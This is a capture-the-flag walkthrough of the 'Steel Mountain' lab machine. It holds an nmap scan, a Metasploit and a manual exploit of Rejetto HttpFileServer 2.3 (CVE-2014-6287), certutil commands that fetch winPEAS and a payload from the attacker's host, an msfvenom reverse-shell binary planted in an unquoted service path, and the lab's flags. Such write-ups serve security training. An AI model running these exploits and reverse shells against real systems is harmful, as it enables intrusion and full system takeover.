# Steel Mountain

IP Address: 10.10.60.65

## Description

In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

## Flags

1. Bill Harper
2. b04763b6fcf51fcd7c13abc7db4fd365
3. 9af5f314f57607c00fd09803a587db80

## Enumeration/Scanning

### Web Servers

Searching `http://10.10.60.65` gives the front page of Steel Mountain and a picture of the Employee of the month. Opening the photo in a new tag reveals the URL `http://10.10.60.65/img/BillHarper.png` and the employee's name Bill Harper.

### Nmap:
```sh
sudo  nmap -sV -vv -sC -oN steel-mountain.nmap 10.10.60.65
# Nmap 7.92 scan initiated Fri Sep 23 21:26:23 2022 as: nmap -sV -vv -sC -oN steel-mountain.nmap 10.10.60.65
Increasing send delay for 10.10.60.65 from 0 to 5 due to 166 out of 552 dropped probes since last increase.
Increasing send delay for 10.10.60.65 from 5 to 10 due to 11 out of 24 dropped probes since last increase.
Increasing send delay for 10.10.60.65 from 10 to 20 due to 11 out of 18 dropped probes since last increase.
Increasing send delay for 10.10.60.65 from 20 to 40 due to 11 out of 15 dropped probes since last increase.
Increasing send delay for 10.10.60.65 from 40 to 80 due to 11 out of 16 dropped probes since last increase.
Increasing send delay for 10.10.60.65 from 80 to 160 due to 11 out of 13 dropped probes since last increase.
Increasing send delay for 10.10.60.65 from 160 to 320 due to 11 out of 12 dropped probes since last increase.
Increasing send delay for 10.10.60.65 from 320 to 640 due to 11 out of 12 dropped probes since last increase.
Increasing send delay for 10.10.60.65 from 640 to 1000 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for 10.10.60.65
Host is up, received echo-reply ttl 127 (0.25s latency).
Scanned at 2022-09-23 21:26:24 PDT for 506s
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE            REASON          VERSION
80/tcp    open  http               syn-ack ttl 127 Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
| ssl-cert: Subject: commonName=steelmountain
| Issuer: commonName=steelmountain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-09-23T03:53:47
| Not valid after:  2023-03-25T03:53:47
| MD5:   bfff 36e5 dabf 4fb4 01ed 6afb c56d 6843
| SHA-1: 96a6 a835 a950 c122 0ff1 6272 7082 fb86 00fd 263f
| -----BEGIN CERTIFICATE-----
| MIIC3jCCAcagAwIBAgIQF2D3jalRSJJOehRTDw1HJTANBgkqhkiG9w0BAQUFADAY
| MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTIyMDkyMzAzNTM0N1oXDTIzMDMy
| NTAzNTM0N1owGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAJj9tq8Nb3yaFYH0mcLFVK/LwKpPunnpVYopdLcx
| 6D6qunt96lZJPQjckqoBZHGo5qFqxaEl9k5lTlUacm6eGd8F5WkEz1jfDZY98LiE
| 2HgDwrewsuuBBCnsU+W3JYXTIP6dyLyu0svBSuDVlJdHJXc/yWKJYPd/tiOA6opN
| KYBr2uVnrk1Um8ZCFJTSq8eh+GdTw/Rpbkck33M5KI8fpajjGFPTq7J8olK140oK
| AyDDvazTgOOnWpoVIfOjLsb1UIC18/DtnwK8+vV2Qj7mIbkbMNCxjy5JMDPR2dXJ
| vT1xYhV/wF6pVy/aff5Ve5Dey5vZhY7E9x0YlZ6KC5y6NOsCAwEAAaMkMCIwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB
| AQCOcLByAwPITGztasTXAjAlvFmm1QLFxZhVm8RYUk6Kmb5I741b0/WuZJm0qN3H
| otEnfbAWhR3h5G5r4UmWNZwwMwrGRdvluiP0ZXyzH4fX4TwZGfoZ9vvfsAio0AWx
| oqCxunpLvD4LvZYT3xHPIk1rDUNfq+xKcuhhf7bwr7nL4XHRMdGeJpxG/XBiDhcZ
| b6wExoQNHA3gS3bLCNOHtgEubCEz6uGnsUGSrhGYKmJo+F2jzAQs43Gzmf0h5gxF
| XqLy5aQQOdoucRweEakwvpiqJGRdPixkiBVknCspU5mWZWboW2AimEBFU7W7mg3o
| qmrJCVSzUYVgOHZbmYZnGx1H
|_-----END CERTIFICATE-----
|_ssl-date: 2022-09-24T04:34:49+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2022-09-24T04:34:44+00:00
8080/tcp  open  http               syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-title: HFS /
49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:87:1f:2c:06:6f (unknown)
| Names:
|   STEELMOUNTAIN<20>    Flags: <unique><active>
|   STEELMOUNTAIN<00>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
| Statistics:
|   02 87 1f 2c 06 6f 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2022-09-24T04:34:44
|_  start_date: 2022-09-24T03:53:37
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 49408/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 28157/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 12748/udp): CLEAN (Timeout)
|   Check 4 (port 13957/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 23 21:34:50 2022 -- 1 IP address (1 host up) scanned in 506.27 seconds
```

## Exploitation

### MSFVenom/Metasploit

Nmap found  HttpFileServer httpd 2.3 running on port 8080. This file server is vulnerable and the exploit can be found underCVE-2014-6287.

```sh
> msfvenom
```
```
msf6 > search HttpFileServer

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
	    -  ----                                   ---------------  ----       -----  -----------
			   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
	Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
```
```
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.60.65
rhosts => 10.10.60.65
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8080
rport => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.231.100
rhosts => 10.10.231.100
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 10.10.231.100
srvhost => 10.10.231.100
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.18.57.77:8000 
[*] Using URL: http://10.18.57.77:4445/eCbav4dYqRYI8NF
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /eCbav4dYqRYI8NF
[*] Sending stage (175686 bytes) to 10.10.231.100
[*] Meterpreter session 3 opened (10.18.57.77:8000 -> 127.0.0.1) at 2022-09-23 21:59:13 -0700

meterpreter > 
```

### Without Metasploit

To access this machine without using metasploit, we start by searching for the exploit (CVE-2014-6287) on [Exploit Database](https://www.exploit-db), and then download it.

Change the Local IP address and Port number.

```sh
vim 39161.py

...
34 
35     ip_addr = "LOCAL_IP" #local IP address
36     local_port = "4444" # Local Port number
...
	 
```
Start a Python Server on Port 80 and a `nc` listener on any port of your choosing, and run the exploit twice with the target IP Address and Port following.

```sh
python3 -m http.server 80
```

```sh
nc -lvnp 4444
```

```sh
python3 39161.py TARGET_IP 8080
```

We now have a command prompt on the netcat listener.

```
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
```

#### Privilege Escalation

To gain elevated privileges, we will first download, transfer, and run winPEAS to find vulnerabilities. 

Download winPEAS to the Windows machine.

```
C:\> certutil -urlcache -f http://LOCAL_IP/winPEASx86.exe winPEAS.exe
```

Then run it with the `servicesinfo` specification.

```
C:\> winPEAS.exe servicesinfo

 Interesting Services -non Microsoft-
  Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
	AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
  File Permissions: bill [WriteData/CreateFiles]
  Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
  Advanced SystemCare Service
```

We see that there is an unquotes path that we can exploit; therefore, we must create a reverse shell named Advanced.exe in the `IObit` directory.

```sh
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.18.57.77 LPORT=4445 -f exe -o Advanced.exe
```
```
certutil -urlcache -split -f http://LOCAL_IP/Advanced.exe "C:\Program Files (x86)\IObit"
```

Finally, run a `nc` listener on Port 4445, then stop/start the service AdvancedSystemCareService9.

```
sc stop AdvancedSystemCareService9
```

```
sc start AdvancedSystemCareService9
```

Now we have system privileges.

```
C:\Windows\system32>
```

Navigate to the adiministrator's desktop and read the `root.txt` file.

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80
```


